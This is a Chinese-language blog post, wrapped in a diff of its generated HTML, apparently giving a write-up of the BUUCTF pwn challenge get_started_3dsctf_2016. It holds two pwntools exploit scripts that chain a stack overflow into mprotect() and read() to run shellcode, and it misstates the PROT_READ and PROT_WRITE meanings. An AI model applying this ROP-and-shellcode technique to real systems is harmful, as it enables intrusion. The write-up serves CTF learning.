@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="分析初探  main函数中存在明显的溢出漏洞，本题目又留出了后门函数，理论上来说通过栈溢出控制返回地址为后门函数，再在栈中放上指定的参数就能getflag。此方法在本地确实可行，但是远程会挂。。 更换思路在ida中找到了mprotect()函数和read()函数   mprotect()函数可以用来修改一段指定内存区域的保护属性，所以可以用mprotect()函数修改一段内存属性为可读、可写、可执">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buu-get_start_3dsctf_2016">
+<meta property="og:url" content="http://example.com/2021/06/15/buu-get-start-3dsctf-2016/index.html">
+<meta property="og:site_name" content="Y">
+<meta property="og:description" content="分析初探  main函数中存在明显的溢出漏洞，本题目又留出了后门函数，理论上来说通过栈溢出控制返回地址为后门函数，再在栈中放上指定的参数就能getflag。此方法在本地确实可行，但是远程会挂。。 更换思路在ida中找到了mprotect()函数和read()函数   mprotect()函数可以用来修改一段指定内存区域的保护属性，所以可以用mprotect()函数修改一段内存属性为可读、可写、可执">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2021/06/15/buu-get-start-3dsctf-2016/main.png">
+<meta property="og:image" content="http://example.com/2021/06/15/buu-get-start-3dsctf-2016/getflag.png">
+<meta property="og:image" content="http://example.com/2021/06/15/buu-get-start-3dsctf-2016/mprotect.png">
+<meta property="og:image" content="http://example.com/2021/06/15/buu-get-start-3dsctf-2016/read.png">
+<meta property="og:image" content="http://example.com/2021/06/15/buu-get-start-3dsctf-2016/gadget.png">
+<meta property="og:image" content="http://example.com/2021/06/15/buu-get-start-3dsctf-2016/duan.png">
+<meta property="og:image" content="http://example.com/2021/06/15/buu-get-start-3dsctf-2016/return.jpg">
+<meta property="og:image" content="http://example.com/2021/06/15/buu-get-start-3dsctf-2016/error.png">
+<meta property="og:image" content="http://example.com/2021/06/15/buu-get-start-3dsctf-2016/align.jpg">
+<meta property="article:published_time" content="2021-06-14T16:17:14.000Z">
+<meta property="article:modified_time" content="2021-06-16T14:52:38.145Z">
+<meta property="article:author" content="yang">
+<meta property="article:tag" content="buu">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="rop">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/06/15/buu-get-start-3dsctf-2016/main.png">
+
+<link rel="canonical" href="http://example.com/2021/06/15/buu-get-start-3dsctf-2016/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>buu-get_start_3dsctf_2016 | Y</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Y</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">dont know write what</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/15/buu-get-start-3dsctf-2016/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yang">
+      <meta itemprop="description" content="it is funny">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          buu-get_start_3dsctf_2016
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-06-15 00:17:14" itemprop="dateCreated datePublished" datetime="2021-06-15T00:17:14+08:00">2021-06-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-06-16 22:52:38" itemprop="dateModified" datetime="2021-06-16T22:52:38+08:00">2021-06-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/buu/" itemprop="url" rel="index"><span itemprop="name">buu</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/buu/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h2><p><img src="/2021/06/15/buu-get-start-3dsctf-2016/main.png"></p>
+<p><img src="/2021/06/15/buu-get-start-3dsctf-2016/getflag.png"></p>
+<p>main函数中存在明显的溢出漏洞，本题目又留出了后门函数，理论上来说通过栈溢出控制返回地址为后门函数，再在栈中放上指定的参数就能getflag。<code>此方法在本地确实可行，但是远程会挂。。</code></p>
+<h2 id="更换思路"><a href="#更换思路" class="headerlink" title="更换思路"></a>更换思路</h2><p>在ida中找到了<code>mprotect()</code>函数和<code>read()</code>函数</p>
+<p><img src="/2021/06/15/buu-get-start-3dsctf-2016/mprotect.png"></p>
+<p><img src="/2021/06/15/buu-get-start-3dsctf-2016/read.png"></p>
+<p>mprotect()函数可以用来修改一段指定内存区域的保护属性，所以可以用mprotect()函数修改一段内存属性为可读、可写、可执行，然后用read()向地址内写入shellcode，并返回到该地址即可getshell</p>
+<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>本题目要在执行完成mprotect()函数之后返回到read()函数，并且两个函数的参数都必须可控，所以要用到寄存器，在mprotect()函数执行完成后，返回到<code>连续pop三个寄存器并返回</code>的地址，就可以清理掉mprotect()执行的时候使用的参数，并且返回到read()，并且read的参数和返回地址可控。</p>
+<h2 id="简单了解一下-mprotect"><a href="#简单了解一下-mprotect" class="headerlink" title="简单了解一下 mprotect()"></a>简单了解一下 mprotect()</h2><p>函数原型</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mprotect</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *start, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</p>
+<blockquote>
+<p>prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</p>
+<p>PROT_READ：表示内存段内的内容可写；</p>
+<p>PROT_WRITE：表示内存段内的内容可读；</p>
+<p>PROT_EXEC：表示内存段中的内容可执行；</p>
+<p>PROT_NONE：表示内存段中的内容根本没法访问。</p>
+</blockquote>
+<p>那么第三个参数怎么控制呢？</p>
+<p>如果你打开/ usr / include / asm-generic，打开mman-common.h，你会发现这些值。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROT_READ 0x1 <span class="comment">/* page can be read */</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROT_WRITE 0x2 <span class="comment">/* page can be written */</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROT_EXEC 0x4 <span class="comment">/* page can be executed */</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROT_SEM 0x8 <span class="comment">/* page may be used for atomic ops */</span> </span></span><br></pre></td></tr></table></figure>
+
+<p>可读可写可执行对应的整数为: 0x1|0x2|0x3=00000001|00000010|00000100=00000111=7</p>
+<h2 id="开始写wp"><a href="#开始写wp" class="headerlink" title="开始写wp"></a>开始写wp</h2><p>首先找到合适的gadget来pop三个寄存器并返回</p>
+<p><img src="/2021/06/15/buu-get-start-3dsctf-2016/gadget.png"></p>
+<p>然后找到bss段的地址</p>
+<p><img src="/2021/06/15/buu-get-start-3dsctf-2016/duan.png"></p>
+<p>初版wp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">sh=process(<span class="string">&quot;./get_started_3dsctf_2016&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./get_started_3dsctf_2016&quot;</span>)</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">mprotect=elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">bss=<span class="number">0x080EBF80</span></span><br><span class="line">read=elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop3ret=<span class="number">0x0804f460</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">56</span>+p32(mprotect)+p32(pop3ret)+p32(bss)+p32(<span class="number">44</span>)+p32(<span class="number">7</span>)+p32(read)+p32(bss)+p32(<span class="number">0</span>)+p32(bss)+p32(<span class="number">44</span>)</span><br><span class="line">payload1=asm(shellcraft.sh())</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>运行后发现完美的段错误，用gdb调试发现bss段内存的保护属性没变，为了搞清楚哪出错了就去查看了mprotect规定的返回值</p>
+<p><img src="/2021/06/15/buu-get-start-3dsctf-2016/return.jpg"></p>
+<blockquote>
+<p>程序运行失败后会返回-1，并设置errno变量来记录错误</p>
+</blockquote>
+<p>然后进行逐步跟踪调试，发现运行结束后返回值为-1</p>
+<p><img src="/2021/06/15/buu-get-start-3dsctf-2016/error.png"></p>
+<blockquote>
+<p>32位程序返回值存在eax里</p>
+</blockquote>
+<p>在设定返回值前，即<code>mov dword ptr gs:[edx], eax</code>便是设置errno的值的指令，此时eax的值为0x16（忘了截图了）即22，据<a target="_blank" rel="noopener" href="https://blog.csdn.net/renlonggg/article/details/78330234">linux errno详解_dragon_cdut的博客-CSDN博客</a>可知，errno=22为参数无效。</p>
+<p>再次查看函数使用规定，发现传入的地址必须按页（0x1000）对齐</p>
+<p><img src="/2021/06/15/buu-get-start-3dsctf-2016/align.jpg"></p>
+<p>稍作修改后的wp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">sh=process(<span class="string">&quot;./get_started_3dsctf_2016&quot;</span>)</span><br><span class="line"><span class="comment"># sh=remote(&quot;node3.buuoj.cn&quot;,25643)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./get_started_3dsctf_2016&quot;</span>)</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">mprotect=elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">gotplt=<span class="number">0x080EB000</span></span><br><span class="line">read=elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop3ret=<span class="number">0x0804f460</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">56</span>+p32(mprotect)+p32(pop3ret)+p32(gotplt)+p32(<span class="number">44</span>)+p32(<span class="number">7</span>)+p32(read)+p32(gotplt)+p32(<span class="number">0</span>)+p32(gotplt)+p32(<span class="number">44</span>)</span><br><span class="line">payload1=asm(shellcraft.sh())</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>成功getshell</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/buu/" rel="tag"># buu</a>
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/rop/" rel="tag"># rop</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/06/13/buu-easyrop/" rel="prev" title="buu-easyrop">
+      <i class="fa fa-chevron-left"></i> buu-easyrop
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/06/15/buu-ciscn-2019-n-8/" rel="next" title="buu-ciscn_2019_n_8">
+      buu-ciscn_2019_n_8 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%9D%E6%8E%A2"><span class="nav-number">1.1.</span> <span class="nav-text">初探</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9B%B4%E6%8D%A2%E6%80%9D%E8%B7%AF"><span class="nav-number">1.2.</span> <span class="nav-text">更换思路</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">解题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E4%BA%86%E8%A7%A3%E4%B8%80%E4%B8%8B-mprotect"><span class="nav-number">2.1.</span> <span class="nav-text">简单了解一下 mprotect()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%80%E5%A7%8B%E5%86%99wp"><span class="nav-number">2.2.</span> <span class="nav-text">开始写wp</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">yang</p>
+  <div class="site-description" itemprop="description">it is funny</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yang</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
